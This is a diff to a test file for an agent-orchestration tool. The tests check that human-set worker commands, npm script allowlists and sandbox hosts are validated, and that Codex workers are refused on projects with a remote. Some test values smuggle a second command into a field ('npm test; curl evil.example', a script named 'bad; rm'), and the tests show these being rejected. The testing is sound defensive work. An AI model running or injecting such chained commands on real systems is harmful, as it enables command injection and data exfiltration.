@@ -215,7 +215,7 @@ describe('nuworq worker --agent claude', () => {
     g(other, 'add', '.');
     g(other, 'commit', '-q', '-m', 'landed elsewhere');
     g(other, 'push', '-q', 'origin', 'main');
-    writeFileSync(join(repo, 'package.json'), JSON.stringify({ scripts: { test: 'node --test', lint: 'x', 'bad; rm': 'y' } })); // a Node project
+    writeFileSync(join(repo, 'package.json'), JSON.stringify({ scripts: { test: 'node --test', lint: 'x', build: 'z', deploy: 'fly deploy', 'bad; rm': 'y' } })); // a Node project
 
     const hub = new Hub();
     hub.tx(() => hub.project('gh', { create: true }));
@@ -223,6 +223,8 @@ describe('nuworq worker --agent claude', () => {
     assert.throws(() => hub.humanOp('gh', 'settings', { sandbox_hosts: 'https://evil.example/x' }), /isn't a host name/);
     assert.throws(() => hub.agentOp('gh', 'settings', 'c-2', { sandbox_hosts: 'evil.example' }), 'an agent can\'t add one');
     assert.equal(hub.project('gh').sandbox_hosts, '["api.stripe.com"]');
+    hub.humanOp('gh', 'settings', { worker_commands: 'npm run e2e' }); // a command beyond its checks, said by a person (#768)
+    assert.throws(() => hub.humanOp('gh', 'settings', { worker_commands: 'npm run e2e; curl evil.example' }), /isn't a command workers may run/);
     const server = createServer(hub);
     await new Promise((r) => server.listen(0, '127.0.0.1', r));
     try {
@@ -233,8 +235,9 @@ describe('nuworq worker --agent claude', () => {
       assert.deepEqual(allow.filter((a) => /git push/.test(a)), ['Bash(git push origin:*)'], 'no other push, and no bare git push');
       assert.deepEqual(allow.filter((a) => /git -C/.test(a)), [], 'no -C command: the hub lands work on origin');
       assert.ok(!allow.some((a) => /^Bash\(git:|^Bash\(git \*|^Bash\(git -C:/.test(a)), 'no blanket git');
-      // The project's own commands (#472): its npm scripts by name, never an interpreter that runs anything.
-      assert.deepEqual(allow.filter((a) => /npm|node|python|cargo|go /.test(a)), ['Bash(npm test:*)', 'Bash(npm ci)', 'Bash(npm install)', 'Bash(npm run lint:*)']);
+      // The project's own checks (#472, #768): its check scripts by name, never an interpreter, npm install or deploy;
+      // and what a person added.
+      assert.deepEqual(allow.filter((a) => /npm|node|python|cargo|go /.test(a)), ['Bash(npm test:*)', 'Bash(npm ci)', 'Bash(npm run lint:*)', 'Bash(npm run build:*)', 'Bash(npm run e2e:*)']);
       assert.match(stdout, /git switch --no-track -c <branch> origin\/main`.*push the branch before you submit \(`git push origin <branch>`\).*only nuworq\/ branches: main and tags are the hub.*where CI checks the pull request, push the rebased branch and let its checks decide; otherwise run the checks, push the rebased branch \(`git push origin <branch> --force-with-lease`\), then submit; the hub puts it on main/);
       assert.doesNotMatch(stdout, /<branch>:main/);
       // Its shell runs in Claude Code's sandbox, from --settings so no file in the repository loosens it.
@@ -380,6 +383,11 @@ describe('a runner refuses sandbox hosts that aren\'t host names', () => {
           return true;
         });
       }
+      // Worker commands (#768) the same way: one that chains another starts nothing.
+      sends([]);
+      hub.q('UPDATE projects SET worker_commands = ? WHERE slug = ?').run(JSON.stringify(['npm test; curl evil.example']), 'h');
+      await assert.rejects(cli(), (e) => /the hub sent worker commands the runner refuses \("npm test; curl evil\.example" isn't a command workers may run\)/.test(e.stderr) && e.stdout === '');
+      hub.q('UPDATE projects SET worker_commands = ? WHERE slug = ?').run('[]', 'h');
       sends(['API.example.com', '*.example.org']);
       const settings = JSON.parse((await cli()).stdout.match(/--settings '([^']*)'/)[1]);
       assert.ok(['api.example.com', '*.example.org'].every((h) => settings.sandbox.network.allowedDomains.includes(h)), 'host names, as checked, reach the sandbox');
@@ -437,6 +445,36 @@ describe('an unsandboxed harness needs its opt-in flag', () => {
         assert.equal(stdout.split('\n').filter((l) => SAYS[agent].test(l)).length, 1, `${agent}: one line\n${stdout}`);
       }
       assert.doesNotMatch((await cli('claude')).stdout, /can read this machine's keys/);
+    } finally {
+      server.close();
+    }
+  });
+
+  // Codex's workspace-write sandbox limits writes and network, not reads (#768): like opencode and pi, it works only
+  // where there's nothing to push to, until Codex can deny reads.
+  test('codex is refused for a project with a remote, by worker and by run; without one it starts as before', async () => {
+    const repo = realpathSync(mkdtempSync(join(tmpdir(), 'nuworq-codex-')));
+    const g = (...a) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { cwd: repo, stdio: 'ignore' });
+    g('init', '-q', '-b', 'main');
+    writeFileSync(join(repo, 'f'), 'x');
+    g('add', '.');
+    g('commit', '-q', '-m', 'init');
+    const hub = new Hub();
+    hub.tx(() => hub.project('cx', { create: true }));
+    hub.humanOp('cx', 'settings', { path: repo });
+    const server = createServer(hub);
+    await new Promise((r) => server.listen(0, '127.0.0.1', r));
+    const env = { ...Object.fromEntries(Object.entries(process.env).filter(([k]) => !/^NUWORQ_/.test(k))), HOME: repo };
+    const cli = (...a) => promisify(execFile)(process.execPath, [BIN, 'worker', '--url', `http://127.0.0.1:${server.address().port}`, '--project', 'cx', '--agent', 'codex', '--can-read-keys', '--as', 'cx-1', ...a], { env, cwd: repo });
+    try {
+      assert.match((await cli()).stdout, /codex exec.* -s workspace-write/, 'no remote: unchanged');
+      g('remote', 'add', 'origin', 'https://github.com/acme/cx.git');
+      await assert.rejects(cli(), (e) => {
+        assert.match(e.stderr, /codex workers aren't started for cx: it has a remote, and Codex's sandbox doesn't keep its shell from this machine's keys/);
+        assert.match(e.stderr, /limits writes and network, not reads\), so it works only on projects without an origin\. Use --agent claude/);
+        assert.equal(e.stdout, '', 'no command printed');
+        return true;
+      });
     } finally {
       server.close();
     }
